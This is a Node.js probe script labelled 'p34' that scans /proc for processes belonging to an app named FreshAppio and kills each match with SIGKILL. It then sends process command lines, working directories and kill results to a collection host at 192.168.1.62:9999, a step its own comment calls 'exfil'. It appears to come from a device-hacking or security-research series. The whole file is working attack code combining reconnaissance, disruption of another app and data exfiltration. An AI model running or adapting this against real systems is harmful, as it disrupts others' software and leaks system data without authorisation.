"use strict";
/* p34: find + kill the FreshAppio WAS app process (uid 5001 -> uid 5001)
   - process map: /proc scan (comm, cmdline, cwd)
   - candidates: cmdline or cwd contains FreshAppio
   - kill -9 candidates (mai il nostro pid)
   - rescan + exfil /p34info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p34', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p34info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 15000;
  return new Promise(function (resolve) {
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 4000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 4500));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function scanProc() {
  var out = [];
  var dirs;
  try { dirs = fs.readdirSync('/proc'); } catch (e) { return '[readdir ' + e + ']'; }
  for (var i = 0; i < dirs.length; i++) {
    var d = dirs[i];
    if (!/^[0-9]+$/.test(d)) continue;
    var comm = '', cmd = '', cwd = '';
    try { comm = fs.readFileSync('/proc/' + d + '/comm', 'utf8').trim(); } catch (e) {}
    try { cmd = fs.readFileSync('/proc/' + d + '/cmdline', 'utf8').replace(/\0/g, ' ').trim(); } catch (e) {}
    try { cwd = fs.readlinkSync('/proc/' + d + '/cwd'); } catch (e) {}
    if (cmd.indexOf('FreshAppio') >= 0 || cwd.indexOf('FreshAppio') >= 0 || cmd.indexOf('apps_rw') >= 0) {
      out.push(d + ' | ' + comm + ' | ' + cmd.substring(0, 160) + ' | cwd=' + cwd.substring(0, 120));
    }
  }
  return out.join('\n');
}

function main() {
  R.results.my_pid = process.pid;
  R.results.proc_scan_1 = scanProc();

  // candidati FreshAppio
  var lines = String(R.results.proc_scan_1).split('\n');
  var cands = [];
  for (var i = 0; i < lines.length; i++) {
    var m = lines[i].match(/^([0-9]+) \|/);
    if (m && lines[i].indexOf('FreshAppio') >= 0 && Number(m[1]) !== process.pid) cands.push(Number(m[1]));
  }
  R.results.fresh_cands = cands.join(',') || 'none';

  if (cands.length) {
    var killRes = [];
    for (var j = 0; j < cands.length; j++) {
      try { process.kill(cands[j], 'SIGKILL'); killRes.push(cands[j] + ':kill-sent'); }
      catch (e) { killRes.push(cands[j] + ':fail(' + e + ')'); }
    }
    R.results.kill_results = killRes.join(' | ');
  }

  // attendo 3s e rescan
  setTimeout(function () {
    R.results.proc_scan_2 = scanProc();
    postFinal();
  }, 3000);
}

main();
